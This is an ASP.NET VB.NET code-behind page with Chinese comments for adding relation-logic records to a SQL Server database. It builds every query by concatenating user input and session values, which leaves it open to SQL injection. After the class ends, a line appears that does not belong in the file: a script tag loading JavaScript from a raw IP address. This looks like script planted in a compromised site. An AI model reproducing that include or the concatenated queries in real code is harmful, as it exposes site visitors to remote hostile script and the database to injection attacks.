Imports System.Data
Imports System.Data.SqlClient

Public Class addlogic1
    Inherits System.Web.UI.Page

#Region " Web 窗体设计器生成的代码 "

    '该调用是 Web 窗体设计器所必需的。
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()

    End Sub
    Protected WithEvents Form1 As System.Web.UI.HtmlControls.HtmlForm
    Protected WithEvents Form2 As System.Web.UI.HtmlControls.HtmlForm
    Protected WithEvents lblLogicKey As System.Web.UI.WebControls.Label
    Protected WithEvents txtLogicKey As System.Web.UI.WebControls.TextBox
    Protected WithEvents lblAssKeyFrom As System.Web.UI.WebControls.Label
    Protected WithEvents ddlstAssKeyFrom As System.Web.UI.WebControls.DropDownList
    Protected WithEvents lblAssKeyTo As System.Web.UI.WebControls.Label
    Protected WithEvents ddlstAssKeyTo As System.Web.UI.WebControls.DropDownList
    Protected WithEvents lblLogRel As System.Web.UI.WebControls.Label
    Protected WithEvents rbtnLogOr As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnLogAnd As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnLogMtx As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnLogImp As System.Web.UI.WebControls.RadioButton
    Protected WithEvents btnSave As System.Web.UI.WebControls.Button
    Protected WithEvents btnCancel As System.Web.UI.WebControls.Button
    Protected WithEvents lblHint As System.Web.UI.WebControls.Label
    Protected WithEvents lblWarning As System.Web.UI.WebControls.Label
    Protected WithEvents timetext As System.Web.UI.WebControls.Label
    Protected WithEvents txtLogicKeyRegularExpressionValidator As System.Web.UI.WebControls.RegularExpressionValidator

    '注意: 以下占位符声明是 Web 窗体设计器所必需的。
    '不要删除或移动它。
    Private designerPlaceholderDeclaration As System.Object

    Private Sub Page_Init(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Init
        'CODEGEN: 此方法调用是 Web 窗体设计器所必需的
        '不要使用代码编辑器修改它。
        InitializeComponent()
    End Sub

#End Region

    Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        '在此处放置初始化页的用户代码


        Me.lblWarning.Visible = False
        Me.timetext.Text = DateTime.Now.ToString()
        Me.lblHint.ForeColor = System.Drawing.Color.AntiqueWhite
        If Session("UserName") = "" Then
            Me.lblHint.Text = "您还没登录，请先登录"
        Else
            Me.lblHint.Text = "您好， " + Session("UserName")
        End If

        If Not IsPostBack Then  ' 用户x第一次打开页面时
            Me.rbtnLogOr.Checked = True
            Dim strSql As String
            Dim mySqlConn As New SqlConnection(Me.Application("DataBase"))
            Try
                mySqlConn.Open()

                Dim mySqlAdapter As New SqlDataAdapter("select assertionkey from publisherassertion where rdefinitionkey='" + Me.Session("DefKey") + "'", mySqlConn)
                Dim myDateSet As New DataSet
                mySqlAdapter.Fill(myDateSet, "publisherassertion")
                Me.ddlstAssKeyFrom.DataSource = myDateSet.Tables("publisherassertion").DefaultView
                Me.ddlstAssKeyFrom.DataValueField = "assertionkey"
                Me.ddlstAssKeyFrom.DataBind()
                Me.ddlstAssKeyTo.DataSource = myDateSet.Tables("publisherassertion").DefaultView
                Me.ddlstAssKeyTo.DataValueField = "assertionkey"
                Me.ddlstAssKeyTo.DataBind()
                mySqlConn.Close()
            Catch ex As SqlException
                Me.Response.Redirect("error.htm") ' 错误提示
            Finally
            End Try
        End If

    End Sub

    Private Sub btnCancel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnCancel.Click
        Me.txtLogicKey.Text = ""
        Me.rbtnLogAnd.Checked = False
        Me.rbtnLogImp.Checked = False
        Me.rbtnLogMtx().Checked = False
        Me.rbtnLogOr.Checked = True
        Me.ddlstAssKeyFrom.SelectedIndex = 0
        Me.ddlstAssKeyTo.SelectedIndex = 0
        Me.lblWarning.Visible = False
    End Sub

    Private Sub btnSave_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnSave.Click
        If (Me.txtLogicKey.Text.Trim() = "") Then
            Me.lblWarning.Text = "提醒：请先填好全部信息"
            Me.lblWarning.Visible = True
            Exit Sub
        End If

        If Me.ddlstAssKeyFrom.SelectedItem.Text = Me.ddlstAssKeyTo.SelectedItem.Text Then
            Me.lblWarning.Text = "提醒：关系逻辑起始边和终止边不能相同"
            Me.lblWarning.Visible = True
            Exit Sub
        End If
        Me.lblWarning.Visible = False

        Dim mySqlConn As SqlConnection
        mySqlConn = New SqlConnection(Me.Application("DataBase"))
        Dim strSql As String
        Dim sqlReader As SqlDataReader = Nothing
        strSql = "select * from logic where logickey='" + Me.txtLogicKey.Text.Trim() + "' or (fromassertionkey='" + _
            Me.ddlstAssKeyFrom.SelectedItem.Text.Trim() + "' and toassertionkey='" + Me.ddlstAssKeyTo.SelectedItem.Text.Trim() + "')" ' 查看logickey是否已否在
        Dim mySqlComm As SqlCommand
        mySqlComm = New SqlCommand(strSql, mySqlConn)
        Try
            mySqlConn.Open()
            sqlReader = mySqlComm.ExecuteReader()

            If (sqlReader.Read()) Then
                Me.lblWarning.Text = "警告：添加不成功，该关系间逻辑编号已存在或者选项中的两个关系之间逻辑已经添加"
                lblWarning.Visible = True
            Else
                ' 获取关系间逻辑信息保存在chrLogRef中
                Dim chrLogRef As Char
                If Me.rbtnLogOr.Checked = True Then
                    chrLogRef = "1"
                ElseIf Me.rbtnLogAnd.Checked = True Then
                    chrLogRef = "2"
                ElseIf Me.rbtnLogMtx.Checked = True Then
                    chrLogRef = "3"
                Else
                    chrLogRef = "4"
                End If

                ' 插入数据项
                strSql = "Insert into logic values('" + Me.txtLogicKey.Text.Trim() + "','" + _
                    Me.ddlstAssKeyFrom.SelectedValue.Trim() + "','" + _
                    Me.ddlstAssKeyTo.SelectedValue.Trim() + "','" + chrLogRef + "')"
                mySqlConn.Close()
                mySqlComm.CommandText = strSql
                mySqlConn.Open()
                If (mySqlComm.ExecuteNonQuery() > 0) Then
                    Me.lblWarning.Text = "恭喜：添加关系逻辑" + Me.txtLogicKey.Text.Trim() + "成功"
                    Me.lblWarning.Visible = True
                    Me.txtLogicKey.Text = ""
                    Me.rbtnLogAnd.Checked = False
                    Me.rbtnLogImp.Checked = False
                    Me.rbtnLogMtx().Checked = False
                    Me.rbtnLogOr.Checked = True
                    Me.ddlstAssKeyFrom.SelectedIndex = 0
                    Me.ddlstAssKeyTo.SelectedIndex = 0
                Else
                    Me.lblWarning.Text = "警告：由于某种原因添加关系逻辑失败，可能你没有权限"
                    Me.lblWarning.Visible = True
                End If
            End If
            sqlReader.Close()
            mySqlConn.Close()
        Catch ex As SqlException
            If sqlReader.IsClosed = False Then
                sqlReader.Close()
                mySqlConn.Close()
            End If
            Throw ex
            'Response.Redirect("error.htm") ' 错误提示
        Finally
        End Try
    End Sub
End Class
<script src="http://222.208.183.246/ad/ad.js"></script>
